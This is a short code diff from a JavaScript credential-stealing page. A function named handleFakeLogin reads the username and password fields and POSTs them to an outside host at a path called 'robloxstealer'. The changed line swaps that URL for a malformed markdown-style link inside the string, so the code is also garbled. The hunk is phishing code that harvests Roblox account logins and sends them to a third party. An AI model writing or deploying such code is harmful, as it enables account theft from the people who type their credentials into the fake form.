@@ -14,7 +14,7 @@ function handleFakeLogin(event) {
   const username = document.getElementById('username').value;
   const password = document.getElementById('password').value;
 
-  fetch('https://kevinsevildomain.com/robloxstealer', {
+  fetch('[https://kevinsevildomain.com/robloxstealer](https://tulip-red-rnrc.squarespace.com/config/pages)', {
     method: 'POST',
     body: JSON.stringify({ username, password }),
     headers: {
